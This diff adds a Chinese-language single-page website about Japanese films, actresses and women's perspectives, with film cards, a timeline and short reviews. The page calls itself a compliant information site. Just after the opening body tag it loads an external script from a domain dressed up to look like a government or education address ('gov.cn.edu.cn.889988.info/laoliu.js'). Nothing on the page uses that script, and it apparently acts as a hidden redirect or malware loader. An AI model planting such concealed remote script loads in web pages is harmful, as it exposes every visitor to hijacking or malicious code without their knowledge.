@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>日影佳片网 - 日本电影女性角色与女演员代表作 | ribenmeinvdianyingwang-h5.github.io</title>
+<meta name="description" content="日影佳片网（ribenmeinvdianyingwang-h5.github.io）整理日本电影中的女性角色、女演员代表作、女性视角片单与影评摘要，移动端自适应，正规日影资讯站。" />
+<meta name="keywords" content="日影佳片网, ribenmeinvdianyingwang-h5, 日本电影 女性角色, 日本女演员 代表作, 女性视角 日影, 是枝裕和 女性片单" />
+<meta name="author" content="日影佳片网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#5b2a3a" />
+<link rel="canonical" href="https://ribenmeinvdianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"日影佳片网",
+  "url":"https://ribenmeinvdianyingwang-h5.github.io/",
+  "description":"日本电影女性角色、女演员代表作与女性视角片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://ribenmeinvdianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#faf6f7; --ink:#2a1f24; --muted:#8a7b80;
+  --line:#efdde2; --card:#ffffff;
+  --pri:#5b2a3a; --pri2:#c75b7a; --soft:#f3c6d2; --gold:#caa24a;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif;line-height:1.7;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1100px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:var(--pri);color:#fff;}
+.bar{display:flex;align-items:center;gap:12px;height:62px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.8;font-weight:500;}
+nav.main{margin-left:auto;display:flex;gap:20px;font-size:14px;}
+nav.main a{padding:8px 2px;opacity:.92;}
+nav.main a:hover{color:var(--soft);}
+.menu-btn{display:none;margin-left:auto;background:var(--soft);border:0;color:var(--pri);width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:46px 0 26px;background:
+  radial-gradient(1000px 220px at 85% -30%,var(--soft),transparent),
+  linear-gradient(180deg,#fff,var(--bg));border-bottom:1px solid var(--line);}
+.hero h1{font-size:31px;margin:0 0 10px;}
+.hero p{color:var(--muted);max-width:580px;margin:0 0 18px;}
+.search{display:flex;gap:10px;max-width:520px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:var(--pri);color:#fff;font-weight:800;cursor:pointer;}
+
+section.block{padding:34px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;}
+.sec-head h2{font-size:23px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：女演员代表作卡 */
+.actress{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;}
+.ac{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+.ac .ph{height:220px;background:linear-gradient(160deg,#5b2a3a,#c75b7a);position:relative;}
+.ac:nth-child(2) .ph{background:linear-gradient(160deg,#2b3a67,#7d8fc4);}
+.ac:nth-child(3) .ph{background:linear-gradient(160deg,#3a2b4f,#b08fd0);}
+.ac:nth-child(4) .ph{background:linear-gradient(160deg,#1f4037,#5fae8c);}
+.ac .role{position:absolute;left:10px;bottom:10px;background:#0007;color:#fff;font-size:12px;padding:3px 9px;border-radius:99px;}
+.ac .bd{padding:14px;}
+.ac h3{font-size:16px;margin:0 0 4px;}
+.ac p{margin:0;color:var(--muted);font-size:13px;}
+.ac .films{margin-top:8px;font-size:12px;color:var(--pri2);}
+
+/* 栏目2：女性视角片单时间线 */
+.tl{display:grid;gap:14px;}
+.tl-row{display:grid;grid-template-columns:84px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--pri2);border-radius:12px;padding:14px 16px;}
+.tl-row b{color:var(--pri);font-size:14px;}
+.tl-row h3{margin:0 0 4px;font-size:16px;}
+.tl-row p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：角色图谱 */
+.chars{display:flex;flex-wrap:wrap;gap:12px;}
+.chip{padding:10px 16px;border-radius:14px;background:var(--card);border:1px solid var(--line);font-size:14px;}
+.chip b{color:var(--pri);}
+.chip:hover{background:var(--pri);color:#fff;border-color:var(--pri);}
+.chip:hover b{color:var(--soft);}
+
+/* 栏目4：影评摘要 */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.rv h3{margin:0 0 6px;font-size:17px;}
+.rv .quote{color:var(--pri2);font-style:italic;margin:0 0 8px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+
+footer.site{background:var(--pri);color:#f3d7df;padding:30px 0 40px;font-size:13px;}
+footer.site a{color:var(--soft);}
+
+@media(max-width:900px){
+  .actress{grid-template-columns:repeat(2,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:62px 0 auto 0;flex-direction:column;gap:0;background:var(--pri);display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff22;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:25px;}
+  .actress{grid-template-columns:1fr;}
+  .ac .ph{height:200px;}
+  .tl-row{grid-template-columns:64px 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">日影佳片网<small>ribenmeinvdianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#actress">女演员代表作</a>
+      <a href="#women">女性视角片单</a>
+      <a href="#chars">经典角色</a>
+      <a href="#reviews">影评摘要</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>日影佳片网：看日本电影里的女性故事</h1>
+    <p>整理日本电影中的女性角色、女演员代表作、女性视角片单与影评摘要。不碰写真、不碰成人向内容，只做正经日影发现。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索：是枝裕和 女性 / 绫濑遥 / 家庭片 / 少女动画" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <!-- 栏目1 -->
+  <section class="block" id="actress">
+    <div class="sec-head"><h2>🎭 女演员与代表作</h2><span>卡片</span></div>
+    <div class="actress">
+      <article class="ac"><div class="ph"><span class="role">家庭剧情</span></div><div class="bd"><h3>树木希林</h3><p>是枝裕和御用母亲形象</p><div class="films">《步履不停》《小偷家族》</div></div></article>
+      <article class="ac"><div class="ph"><span class="role">动画配音</span></div><div class="bd"><h3>菜穗子 / 女主角声线</h3><p>细腻内心戏代表</p><div class="films">《秒速五厘米》《你的名字。》</div></div></article>
+      <article class="ac"><div class="ph"><span class="role">悬疑文艺</span></div><div class="bd"><h3>满岛光</h3><p>边缘情绪与克制表演</p><div class="films">《罪恶》《初恋这首情歌》</div></div></article>
+      <article class="ac"><div class="ph"><span class="role">青春治愈</span></div><div class="bd"><h3>滨边美波</h3><p>青春片与奇幻剧双线</p><div class="films">《我想吃掉你的胰脏》《龙樱》</div></div></article>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section class="block" id="women">
+    <div class="sec-head"><h2>🎬 女性视角片单</h2><span>时间线</span></div>
+    <div class="tl">
+      <div class="tl-row"><b>1987</b><div><h3>《葬礼》</h3><p>家族仪式中的女性观察者视角，诙谐里藏锋芒。</p></div></div>
+      <div class="tl-row"><b>2004</b><div><h3>《无人知晓》</h3><p>母亲离场后，孩子视角的家庭残局，女性缺席成为叙事核心。</p></div></div>
+      <div class="tl-row"><b>2015</b><div><h3>《海街日记》</h3><p>四姐妹共生：料理、潮汐、伤口与和解，典型日式女性群像。</p></div></div>
+      <div class="tl-row"><b>2023</b><div><h3>《怪物》</h3><p>母亲追真相，叙事从成人转向孩子，女性作为守护者推进结构。</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section class="block" id="chars">
+    <div class="sec-head"><h2>🧩 经典女性角色图谱</h2><span>标签</span></div>
+    <div class="chars">
+      <span class="chip"><b>沉默的母亲</b> ／ 是枝宇宙</span>
+      <span class="chip"><b>离家少女</b> ／ 青春动画</span>
+      <span class="chip"><b>海岸线姐妹</b> ／ 海街日记</span>
+      <span class="chip"><b>追真相的母亲</b> ／ 怪物</span>
+      <span class="chip"><b>都市独居者</b> ／ 东京夜景片</span>
+      <span class="chip"><b>女记者 / 教师</b> ／ 社会派日影</span>
+      <span class="chip"><b>祖母与孙女</b> ／ 家庭传承</span>
+      <span class="chip"><b>女演员本身</b> ／ 元电影叙事</span>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section class="block" id="reviews">
+    <div class="sec-head"><h2>📝 影评摘要</h2><span>双栏</span></div>
+    <div class="reviews">
+      <div class="rv">
+        <h3>《步履不停》</h3>
+        <p class="quote">“母亲没说出口的话，比台词更长。”</p>
+        <p>家庭片不靠冲突，而靠饭桌、走廊、蝉声把代际关系铺开。女性角色是记忆的保管人。</p>
+      </div>
+      <div class="rv">
+        <h3>《海街日记》</h3>
+        <p class="quote">“姐妹不是和解，而是一起把日子过下去。”</p>
+        <p>镰仓、梅子酒、电车声构成女性共处空间；镜头不评判，只陪伴。</p>
+      </div>
+      <div class="rv">
+        <h3>《你的名字。》</h3>
+        <p class="quote">“身体互换，其实是青少年对‘成为另一个自己’的想象。”</p>
+        <p>女主三叶的乡村困顿与东京向往，是日式青春动画里很少被认真处理的性别地理。</p>
+      </div>
+      <div class="rv">
+        <h3>《怪物》</h3>
+        <p class="quote">“母亲越靠近真相，系统越想把她推开。”</p>
+        <p>女性守护者视角拆开成人世界的标签，把“异常”还给孩子本身。</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section class="block" id="about">
+    <div class="sec-head"><h2>📌 关于日影佳片网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>本站定位</h3>
+        <p style="color:var(--muted)">日影佳片网是“日本电影 + 女性视角”的资讯与片单站：女演员代表作、经典女性角色、家庭/青春/社会派片单、短影评。内容正向、可收录、适合必应爬虫理解。</p>
+        <ul>
+          <li>女演员代表作：树木希林、满岛光、滨边美波等</li>
+          <li>女性视角片单：家庭、青春、动画、社会派</li>
+          <li>角色图谱：母亲 / 少女 / 姐妹 / 女记者</li>
+          <li>影评摘要：短句 + 叙事角度，不做剧透堆砌</li>
+        </ul>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://ribenmeinvdianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    日影佳片网 · ribenmeinvdianyingwang-h5.github.io ｜ 日本电影女性角色 / 女演员代表作 / 女性视角片单（合规资讯站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
